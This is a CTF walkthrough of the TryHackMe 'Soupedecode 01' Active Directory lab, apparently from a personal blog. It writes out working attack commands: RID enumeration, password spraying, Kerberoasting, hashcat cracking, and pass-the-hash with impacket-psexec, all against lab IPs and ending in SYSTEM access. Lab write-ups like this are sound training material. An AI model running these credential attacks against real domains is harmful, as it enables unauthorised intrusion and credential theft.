---
title: "[TryHackMe] walkthrough: Soupedecode 01 (Active Directory)"
date: 2025-09-30
categories: [tryhackme]
tags: [thm, Windows, AD]
---

![title](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.36.35.png)

## Info

- Platform: Tryhackme
- Machine Name: Soupedecode 01
- Target IP/Host: 10.10.105.3
- OS / Version: Windows (AD)
- Difficulty / Category: Easy

## Overview

Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

## Recon & Enumeration

First, scan IP with nmap.

```
┌──(kali㉿kali)-[~/thm/Soupedecode_01/recon]
└─$ sudo nmap 10.10.105.3 -n --min-rate 3000                                                       
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 18:37 KST
Nmap scan report for 10.10.105.3
Host is up (0.42s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.93 seconds
```

It seems to be a domain controller.

I ran a more detailed scan with the -A flag.

```
PORT     STATE SERVICE       VERSION                                                                                                                         
53/tcp   open  domain        Simple DNS Plus                                                                                                                 
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-30 06:32:52Z)                                                                  
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                           
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                   
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                            
445/tcp  open  microsoft-ds?                                                                                                                                 
464/tcp  open  kpasswd5?                                                                                                                                     
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             
636/tcp  open  tcpwrapped                                                                                                                                    
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                            
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-30T06:33:29+00:00
|_ssl-date: 2025-09-30T06:34:08+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42 
|_Not valid after:  2025-12-17T21:35:42 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-30T06:33:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
```
Found the domain name and computer name.

domain name : SOUPEDECODE.LOCAL  
computer name : DC01.SOUPEDECODE.LOCAL

Mapping this info in /etc/hosts:
`10.10.105.3 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL`

I tried smb null session, but failed.
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%206.42.59.png)

So tried smb guest login, and succeeded.
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%206.44.33.png)

The guest account had read permission to the IPC$ share, so I performed RID enumeration.
```
nxc smb 10.10.105.3 -u guest -p "" --rid | tee rid.txt
```
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%206.47.49.png)
-> obtained a user list.

```
cat rid.txt | cut -d '\' -f2 | cut -d ' ' -f1 >> users.txt
```

## Initial Access

(I restarted the machine, so ip has been changed)

I obtained a user list, and tried as-rep roasting (impacket-getNPUsers) but failed.  
So I attempted a password spraying using username:username.

```
nxc smb 10.10.158.202 -u users.txt -p users.txt --no-brute --continue-on-success
```

I think this was the key part of the machine.

I found one credential: ybob317:ybob317
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.06.33.png)

ybob317 can read the Users share.
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.08.38.png)

```
smbclient -U ybob317 //10.10.158.202/Users
```

In the Desktop folder, there was user.txt
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.10.31.png)


## Privilege Escalation

With a domain user credential, I tried kerberoating.

Kerberoasting can be done with Impacket or nxc, I used nxc.
```
nxc ldap 10.10.158.202 -u ybob317 -p 'ybob317' -d SOUPEDECODE.LOCAL --kerberoasting spn_hash
```

![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.14.49.png)

I got hases in spn_hash, and craked them with hashcat.

```
hashcat -a 0 -m 13100 spn_hash /usr/share/wordlists/rockyou.txt
```
-> got file_svc's plain password, and file_svc can read backup share.

![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.18.05.png)

In backup share, found backup_extract.txt and it contains hashes.

![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.19.24.png)
![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.19.55.png)

First split the file into user and hash.
```
┌──(kali㉿kali)-[~/thm/Soupedecode_01/post]
└─$ cat backup_extract.txt | cut -d ':' -f1 > users.txt
└─$ cat backup_extract.txt | cut -d ':' -f4 > hashes.txt
```
I performed password spraying with nxc.
```
nxc smb 10.10.158.202 -u users.txt -H hashes.txt --no-brute --continue-on-success
```

![](/assets/images/tryhackme/soupedecode_01/스크린샷%202025-09-30%20오후%207.23.49.png)

FileServer$ was marked as pwn3d!

-> impacket-psexec
```
impacket-psexec 'FileServer$'@10.10.158.202 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```
I obtained system privileges and found root.txt in C:\Users\Administrator\Desktop.